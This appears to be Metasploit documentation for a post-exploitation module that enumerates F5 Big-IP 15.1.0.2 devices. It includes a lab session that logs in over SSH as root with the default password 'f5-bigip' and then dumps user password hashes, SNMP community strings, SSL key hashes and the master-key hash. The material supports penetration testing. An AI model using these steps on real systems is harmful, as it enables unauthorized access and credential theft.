## Vulnerable Application

This module has been tested on the following hardware/OS combinations.

* F5 Big-IP 15.1.0.2

This module will look for the following parameters which contain credentials:

* Big-IP
  * user
  * SNMP
  * key hashes
  * SSL keys

## Verification Steps

1. Start msfconsole
1. Get a shell
1. Do: `use post/networking/gather/enum_f5`
1. Do: `set session [id]`
1. Do: `set verbose true`
1. Do: `run`

## Options

## Scenarios

### F5 Big-IP 15.1.0.2

```
resource (f5_ssh.rb)> use auxiliary/scanner/ssh/ssh_login
resource (f5_ssh.rb)> set username root
username => root
resource (f5_ssh.rb)> set password f5-bigip
password => f5-bigip
resource (f5_ssh.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (f5_ssh.rb)> run
[+] 2.2.2.2:22 - Success: 'root:f5-bigip' 'uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux f5bigip.ragedomain 3.10.0-862.14.4.el7.ve.x86_64 #1 SMP Fri Mar 20 17:06:49 PDT 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (1.1.1.1:42443 -> 2.2.2.2:22) at 2020-08-20 14:39:08 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
resource (f5_ssh.rb)> use post/networking/gather/enum_f5
resource (f5_ssh.rb)> set session 1
session => 1
resource (f5_ssh.rb)> set verbose true
verbose => true
resource (f5_ssh.rb)> run
[!] SESSION may not be compatible with this module.
[*] Moving to TMOS prompt
[+] Config information stored in to loot /home/h00die/.msf4/loot/20200820143924_default_2.2.2.2_f5.version_351096.txt
[+] Version: BIG-IP 15.1.0.2 0.0.9
[*] Gathering info from show sys
[+] Saving to /home/h00die/.msf4/loot/20200820143929_default_2.2.2.2_F5.show_sys_066269.txt
[+] 2.2.2.2:22 F5 master-key hash EFt+B7/aTWwPwLoMd8KLYW4JB3K5B6301k4pGsoWnZEb2yUbvEJgNU3FcLHo0S4QvdrwVcKrNtHLzebC7HizHQ==
[+] 2.2.2.2:22 F5 previous hash EFt+B7/aTWwPwLoMd8KLYW4JB3K5B6301k4pGsoWnZEb2yUbvEJgNU3FcLHo0S4QvdrwVcKrNtHLzebC7HizHQ==
[*] Gathering info from show auth
[+] Saving to /home/h00die/.msf4/loot/20200820143934_default_2.2.2.2_F5.show_auth_823862.txt
[*] Gathering info from show cm
[+] Saving to /home/h00die/.msf4/loot/20200820143939_default_2.2.2.2_F5.show_cm_704510.txt
[*] Gathering info from show net
[+] Saving to /home/h00die/.msf4/loot/20200820143944_default_2.2.2.2_F5.show_net_045166.txt
[*] Gathering info from show running-config
[+] Saving to /home/h00die/.msf4/loot/20200820143949_default_2.2.2.2_F5.show_running__097351.txt
[+] 2.2.2.2:22 Username 'admin' with description 'Admin User' and shell tmsh with hash $6$PQvaMmyS$Bn5.2qIin7rC34tHUQ1Vu6fEeuDzQZqc25TSiDsmbB903RENBisWbTN9Mqh7g2x26VUbxdzwUzzmL7fB4T2iy1
[+] 2.2.2.2:22 Username 'superlegit' with description 'a user account' and shell tmsh with hash $6$FTQz2reX$U0o37QjQYdg42dwCcLa.1H85hVTriQtxhlMoIM0cs4DFyW5s26kbrEgZG5Mfaxi9fgFfHrvDBGad7ikXnEZIP0
[+] 2.2.2.2:22 Username 't' with description 't' and shell none with hash $6$iajXIq2B$ezy4hVW9A.5eN1xG4JZWFbY4bFaq7uUKwO9gDVLxvgzigsX4gquLW1NoSaZP9CtN0NnrbGV4QvtkA.esLJOg50
[+] 2.2.2.2:22 SNMP Community 'public' with RO access
[+] 2.2.2.2:22 SNMP Community 'rocommunity' with RO access
[+] 2.2.2.2:22 SNMP Community 'rwcommunity' with RW access
[+] 2.2.2.2:22 Hostname: f5bigip.ragedomain
[+] 2.2.2.2:22 MAC Address: 00:0c:29:18:49:c7
[+] 2.2.2.2:22 Management IP: 2.2.2.2
[+] 2.2.2.2:22 Product BIG-IP
[+] 2.2.2.2:22 OS Version: 15.1.0.2
[+] 2.2.2.2:22 SSL Key 'f5_api_com.key' and hash $M$by$gXTDo23Gz+Yz4fWA4uBbTccd+oD1pdsXJbwhvhMPiss4Iw0RKIJQS/CuSReZl/+kseKpPCNpBWNWOOaBCwlQ0v4sl7ZUkxCymh5pfFNAjhc= for /config/ssl/ssl.key/f5_api_com.key
[*] Gathering info from show sys crypto master-key
[+] Saving to /home/h00die/.msf4/loot/20200820143954_default_2.2.2.2_F5.show_crypto_k_313673.txt
[+] 2.2.2.2:22 F5 master-key hash EFt+B7/aTWwPwLoMd8KLYW4JB3K5B6301k4pGsoWnZEb2yUbvEJgNU3FcLHo0S4QvdrwVcKrNtHLzebC7HizHQ==
[+] 2.2.2.2:22 F5 previous hash EFt+B7/aTWwPwLoMd8KLYW4JB3K5B6301k4pGsoWnZEb2yUbvEJgNU3FcLHo0S4QvdrwVcKrNtHLzebC7HizHQ==
[*] Gathering info from cat /config/bigip.conf
[+] Saving to /home/h00die/.msf4/loot/20200820144005_default_2.2.2.2_F5.bigip.conf_401821.txt
[+] 2.2.2.2:22 SSL Key '/Common/f5_api_com.key' and hash $M$iE$cIdy72xi7Xbk3kazSrpdfscd+oD1pdsXJbwhvhMPiss4Iw0RKIJQS/CuSReZl/+kseKpPCNpBWNWOOaBCwlQ0v4sl7ZUkxCymh5pfFNAjhc= for /config/ssl/ssl.key/f5_api_com.key
[*] Gathering info from cat /config/bigip_base.conf
[+] Saving to /home/h00die/.msf4/loot/20200820144010_default_2.2.2.2_F5.bigip_base.co_869534.txt
[+] 2.2.2.2:22 SNMP Community 'public' with RO access
[+] 2.2.2.2:22 Hostname: f5bigip.ragegroup.com
[+] 2.2.2.2:22 MAC Address: 00:0c:29:18:49:c7
[+] 2.2.2.2:22 Management IP: 2.2.2.2
[+] 2.2.2.2:22 Product BIG-IP
[+] 2.2.2.2:22 OS Version: 15.1.0.2
[*] Gathering info from cat /config/bigip_gtm.conf
[+] Saving to /home/h00die/.msf4/loot/20200820144015_default_2.2.2.2_F5.bigip_gtm.con_315221.txt
[*] Gathering info from cat /config/bigip_script.conf
[+] Saving to /home/h00die/.msf4/loot/20200820144020_default_2.2.2.2_F5.bigip_script._498011.txt
[*] Gathering info from cat /config/bigip_user.conf
[+] Saving to /home/h00die/.msf4/loot/20200820144025_default_2.2.2.2_F5.bigip_user.co_687618.txt
[*] Gathering info from cat /config/user_alert.conf
[+] Saving to /home/h00die/.msf4/loot/20200820144030_default_2.2.2.2_F5.user_alert.co_138139.txt
[*] Post module execution completed
```

